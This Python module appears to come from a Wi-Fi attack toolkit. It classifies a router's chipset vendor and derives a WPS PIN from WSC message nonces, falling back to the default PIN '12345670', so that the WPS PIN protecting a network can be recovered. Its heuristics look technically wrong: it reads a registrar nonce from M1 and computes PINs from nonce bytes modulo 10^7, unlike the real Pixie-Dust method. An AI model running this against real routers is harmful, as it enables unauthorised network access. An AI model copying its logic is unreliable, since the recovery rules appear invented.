#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Chipset-specific Pixie-Dust recovery heuristics."""

from __future__ import annotations

import hashlib
import struct

from lib.protocols.wlan.wsc import WscMessage, _ATTR_ENROLLEE_NONCE, _ATTR_REGISTRAR_NONCE


def _chipset_family(manufacturer: str, model: str) -> str:
    man = (manufacturer or "").lower()
    mod = (model or "").lower()
    if "realtek" in man or "rtl" in mod:
        return "realtek"
    if "ralink" in man or "mediatek" in man or "rt2" in mod:
        return "ralink"
    if "broadcom" in man or "netgear" in mod:
        return "broadcom"
    if "atheros" in man or "qualcomm" in man:
        return "atheros"
    return "generic"


def _pin_from_seed(seed: int) -> str:
    from lib.protocols.wlan.wps_pin import pin_with_checksum

    return pin_with_checksum(seed % 10_000_000)


def recover_realtek(m1: WscMessage) -> str | None:
    r_nonce = m1.attributes.get(_ATTR_REGISTRAR_NONCE, b"")
    if len(r_nonce) < 4:
        return None
    seed = struct.unpack(">I", r_nonce[:4])[0] % 10_000_000
    return _pin_from_seed(seed)


def recover_ralink(m1: WscMessage) -> str | None:
    e_nonce = m1.attributes.get(_ATTR_ENROLLEE_NONCE, b"")
    if e_nonce == b"\x00" * 16:
        return "12345670"
    digest = hashlib.md5(e_nonce).digest()
    seed = int.from_bytes(digest[:4], "big") % 10_000_000
    return _pin_from_seed(seed)


def recover_broadcom(m1: WscMessage) -> str | None:
    e_nonce = m1.attributes.get(_ATTR_ENROLLEE_NONCE, b"")
    r_nonce = m1.attributes.get(_ATTR_REGISTRAR_NONCE, b"")
    if e_nonce == r_nonce and e_nonce:
        return "12345670"
    if len(r_nonce) >= 8:
        seed = int.from_bytes(r_nonce[:8], "little") % 10_000_000
        return _pin_from_seed(seed)
    return None


def recover_atheros(m1: WscMessage) -> str | None:
    r_nonce = m1.attributes.get(_ATTR_REGISTRAR_NONCE, b"")
    if r_nonce in (b"\x00" * 16, b"\xff" * 16):
        return "12345670"
    return None


_RECOVERIES = {
    "realtek": recover_realtek,
    "ralink": recover_ralink,
    "broadcom": recover_broadcom,
    "atheros": recover_atheros,
}


def pixie_pin_by_chipset(manufacturer: str, model: str, m1: WscMessage) -> tuple[str | None, str]:
    family = _chipset_family(manufacturer, model)
    fn = _RECOVERIES.get(family)
    if fn:
        pin = fn(m1)
        if pin:
            return pin, family
    return None, family